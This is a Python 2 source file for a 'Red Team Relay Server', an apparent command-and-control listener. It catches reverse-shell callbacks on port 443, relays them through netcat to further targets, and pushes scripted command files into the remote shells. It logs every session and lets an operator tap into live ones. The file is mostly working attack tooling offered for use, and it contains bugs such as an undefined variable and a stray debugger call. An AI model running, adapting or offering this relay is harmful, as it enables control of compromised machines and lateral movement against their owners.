#!/usr/bin/python2

from twisted.internet.protocol import Factory
from twisted.protocols.basic import LineReceiver
from twisted.internet import reactor, protocol, defer
from os.path import isfile, join
import pdb, datetime, re, os, stat

LISTEN_PORT = 443 # Your callbacks should be sent here
COMMAND_PORT = 444 # Port to interact with server
NETCAT = '/bin/nc' 
PROMPT = r'# $' #default shell prompt

class Listener(LineReceiver):
	
	def __init__(self, hosts, sched, conn, jobs):
		self.hosts = hosts 	# List of called in hosts
		self.sched = sched	# List of scheduled relays
		self.conn = conn 	# List of established relays
		self.jobs = jobs	# List of scheduled jobs
		self.nc = None
		self.job = None

	def connectionMade(self):
		host = self.transport.getPeer().host
		print "Connected: ", host

		for record in self.hosts: # Remove old record of last call-in if this one is new
			if host in record:
				self.hosts.remove(record)
		
		self.hosts.append((host, datetime.datetime.now())) # Add record of call-in with ip and time

		if self.sched:
			for record in self.sched:
				shost, target, port, count = record
				if shost == host:
					cmd = [NETCAT, target, port]
					cwd = '/tmp'
						
					self.conn.append([host, target, port])
					self.nc = ProcessProtocol(self, [host, target])	
					reactor.spawnProcess(self.nc, cmd[0], cmd, {}, cwd)
	
					if count == 1:
						self.sched.remove(record)
					if count >= 1:
						record[3] -= 1

		if self.jobs:
			for shost, job, p, c in self.jobs:
				if shost == host:
					self.job = 1

		#Kill it if we got nothing for the callback
		if not self.job and not self.nc:
			self.transport.loseConnection()

	def dataReceived(self, data):
		if self.nc != None:
			self.nc.transport.write(data)
			self.nc.log.write(data) #TODO Handle exceptions here
			self.nc.log.flush()

		if self.jobs:
			for host, target, port in self.conn:
				if host == self.transport.getPeer().host:
					return # Don't muck with established connections. 
			for job in self.jobs:
				shost, filename, prompt, count = job
				if shost == self.transport.getPeer().host:
					if re.search(prompt, data): # Found prompt. Lets start sending our job over.
						with open(os.getcwd() + "/jobs/" + filename) as jobfile:
							for line in jobfile.readlines():
								self.sendLine(line)
						print "Completed " + filename
						self.transport.loseConnection()
						if count == 1:
							self.jobs.remove(job)
						if count > 1:
							job[3] -= 1
								
	def connectionLost(self, reason):
		if self.nc != None:
			self.nc.transport.loseConnection()
			self.nc.log.close()

class ProcessProtocol(protocol.ProcessProtocol):
	
	def __init__(self, nc, conn):
		self.nc = nc
		host, target = conn
		self.log = open(os.getcwd() + "/sessions/" + host + "--" + target, "a") 
			
	def outReceived(self, data):
		self.nc.transport.write(data)
		self.log.write(data)
		self.log.flush()

	def processEnded(self, reason):
		if self.nc.conn:
			for record in self.nc.conn:
				if self.nc.transport.getPeer().host == record[0]:
					self.nc.conn.remove(record)

		self.nc.transport.loseConnection()
		self.log.close()

class ListenerFactory(Factory):

	def __init__(self):
		self.hosts = []
		self.sched = []
		self.conn = []
		self.jobs = []
		
	def buildProtocol(self, addr):
		return Listener(self.hosts, self.sched, self.conn, self.jobs)

class Control(LineReceiver):
	delimiter = "\n"
	
	def __init__(self, listener):
		self.hosts = listener.hosts
		self.tapfile = None
		self.state = "MENU"
		self.name = "--- Red Team Relay Server v0.4 ---\nListening on Port: " + str(LISTEN_PORT) + "\n\n"
		self.help = "--------------------------------------\nshow  - Show last connections\nlist  - List scheduled relays, active relays, and jobs\nadd   - Add relay (ex. add <host> <target> <port> (<times to run> default is forever)\n        Add job (ex. add <host or all> <job> (<times to run> default is forever))\ndel   - Delete relay(s) (ex. del <target> or del all)\n        Delete job (ex. del <target or all> <job>)\nclean - Clear out last connections cache\njobs  - Show available jobs. Specify a job name to view the job\ntap   - Show viewable sessions. Specify session # to tap into.\n--------------------------------------"

	def connectionMade(self):
		self.sendLine(self.name + "(type help for commands)")

	def lineReceived(self, line):
		if self.state == "MENU":
			self.handle_menu(line)
		if self.state == "TAP":
			if re.match(r'^q', line):
				self.state = "MENU"
				self.sendLine("Exiting tap..")
			
	def handle_menu(self, cmd):
		if re.match(r'^(quit|exit)', cmd):
			self.transport.loseConnection()

		if re.match(r'^c', cmd):
			listener.hosts = []

		if re.match(r'^s', cmd):
			self.hosts = listener.hosts
			if self.hosts:
				for h,d in self.hosts:
					self.sendLine(str(h) + "     -- " + d.strftime("%I:%M%p"))
			else:
				self.sendLine("No connections")

		if re.match(r'^a', cmd):
			ipregex = r'([0-9]{1,3}\.){3}[0-9]{1,3}'
			args = len(cmd.split())
			count = 0 # Default. Forever

			if args == 4 or args == 5:
				if args == 5:
					c, host, target, port, count = cmd.split()
				else:
					c, host, target, port = cmd.split()

				#schedule relay
				if re.match(ipregex, host) and re.match(ipregex, target) and re.match(r'[0-9]{1,5}', port):
					listener.sched.append([host, target, port, int(count)])	

				#schedule job
				elif re.match(ipregex,host) and re.match(r'[a-zA-Z0-9]+', target):
					if re.match(r'[0-9]+', port):
						listener.jobs.append([host, target, PROMPT, int(port)]) #host, job, default prompt, count
					elif count > 0:
						listener.jobs.append([host, target, port, count]) #host, job, prompt, count
					else:
						listener.jobs.append([host, target, port, None]) #host, job, prompt, default count
				
				#schedule job for all callbacks for a set number of times 
				elif re.match(r'all', host) and re.match(r'[a-zA-Z0-9]+', target) and re.match(r'[0-9]+', port):
					for h, time in listener.hosts:
						listener.jobs.append([h, job, PORMPT, int(port)])
				
				else:
					sendLine("Your command was weird")

			if args == 3:
				c, host, job = cmd.split()

				#schedule job for a callback
				if re.match(ipregex, host) and re.match(r'[a-zA-Z0-9]+', job):
					listener.jobs.append([host, job, PROMPT, None])

				#schedule job for all callbacks
				if re.match(r'all', host) and re.match(r'[a-zA-Z0-9]+', job):
					for h, time in listener.hosts:
						listener.jobs.append([h, job, PROMPT, None])

		if re.match(r'^d', cmd):
			if len(cmd.split()) == 3:
				c, host, job = cmd.split()
				for record in listener.jobs:
					if host and job in record:
						listener.jobs.remove(record)
				#delete all jobs
				if re.match(r'^a', host) and re.match(r'^j', job):
					listener.jobs = []

			if len(cmd.split()) == 2:
				c, host = cmd.split()
				#delete all relays
				if re.match(r'^a', host):
					listener.sched = []	
				elif re.match(r'[a-zA-Z0-9]+', host):
					for record in listener.jobs:
						if host in record:
							listener.jobs.remove(record)
				else:
					for record in listener.sched:
						if host in record:
							listener.sched.remove(record)
			
		if re.match(r'^l', cmd):
			showsched = showconn = showjobs = False
			if len(cmd.split()) == 2:
				if re.match(r'r',cmd.split()[1]): showsched = True
				elif re.match(r'c',cmd.split()[1]): showconn = True
				elif re.match(r'j',cmd.split()[1]): showjobs = True
			else:
				showsched = showconn = showjobs = True

			if listener.sched and showsched:
				self.sendLine("--- Relays ---")
				for host, target, port, count in listener.sched:
					if count == 0:
						self.sendLine(host + " will be relayed to " + target + " on port " + port)
					else:
						self.sendLine(host + " will be relayed to " + target + " on port " + port + " " + str(count) + " more times")
			if listener.conn and showconn:
				self.sendLine("\n--- Connections ---")
				for host, target, port in listener.conn:
					self.sendLine(host + " --> " + target + ":" + port)
			
			if listener.jobs and showjobs:
				self.sendLine("\n--- Jobs ---")
				for host, job, p, count in listener.jobs:
					if count == None:
						self.sendLine(host + " --> " + job)
					else:
						self.sendLine(host + " --> " + job + " '" + str(count) + "' more times")

		if re.match(r'^j', cmd):
			path = os.getcwd() + "/jobs/"
			if len(cmd.split()) == 2:
				c, filename = cmd.split()
				with open(path + filename) as jobfile: #TODO handle exceptions
					for line in jobfile.readlines():
						self.sendLine(line)
			else:
				jobs = [ f for f in os.listdir(path) if isfile(join(path,f)) ]
				for j in jobs:
					self.sendLine(j)
				
		if re.match(r'^t', cmd):
			if len(cmd.split()) == 2:
				for i, (host, target, port) in enumerate(listener.conn):
					if i == int(cmd.split()[1]):
						self.sendLine("Tapping into session.. enter 'q' to quit")
						self.state = "TAP"
						session = os.getcwd() + "/sessions/" + host + "--" + target
						self.tailfile(session, self.sendLine)
			else:
				for i, (host, target, port) in enumerate(listener.conn):
					self.sendLine(str(i) + ": " + host + " --> " + target + ":" + port)
				
		if re.match(r'h', cmd):
			self.sendLine(self.help)	
		
		self.sendLine("") #newline after every input.
			
	def file_identity(self, struct_stat):
		return struct_stat[stat.ST_DEV], struct_stat[stat.ST_INO]

	def tailfile(self, filename, callback, freq=1, fileobj=None, fstat=None):
	    	if fileobj is None:
			fileobj = open(filename)
			fileobj.seek(0, 2)
		line = fileobj.read()
		if line: 
			callback(line)
			pdb.set_trace()
	    	if fstat is None: fstat = os.fstat(fileobj.fileno())
	    	try: stat = os.stat(filename)
	    	except: stat = fstat
	    	if self.file_identity(stat) != self.file_identity(fstat):
			fileobj = open(filename)
			fstat = os.fstat(fileobj.fileno())
		if self.state == "TAP":
			reactor.callLater(freq, lambda: self.tailfile(filename, callback, freq, fileobj, fstat))	

class ControlFactory(Factory):
	def __init__(self, listener):
		self.listener = listener

	def buildProtocol(self, addr):
		return Control(self.listener)

listener = ListenerFactory()
reactor.listenTCP(LISTEN_PORT, listener)
reactor.listenTCP(COMMAND_PORT, ControlFactory(listener))
reactor.run()
